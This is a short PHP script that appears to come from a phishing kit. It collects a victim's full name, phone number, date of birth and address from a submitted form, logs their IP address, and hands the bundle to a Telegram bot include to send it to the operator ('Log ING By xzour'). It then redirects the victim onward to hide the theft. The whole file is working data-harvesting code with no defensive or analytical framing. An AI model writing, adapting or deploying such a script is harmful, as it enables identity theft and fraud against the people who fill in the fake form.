<?php

$Xzour = getenv("REMOTE_ADDR");

$message .= "--++-----[ INFORMAION ]-----++--\n";

$message .= "Full name: ".$_POST['fname']."\n";
$message .= "phonee numbr: ".$_POST['phone']."\n";
$message .= "DDOOBB: ".$_POST['dob']."\n";
$message .= "addres: ".$_POST['address']."\n";

$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $Xzour\n";
$subject = "Log ING By xzour [ " . $Xzour . " ] ";
include('./telegram_bot.php');

 header("Location: ../C.php");

?>

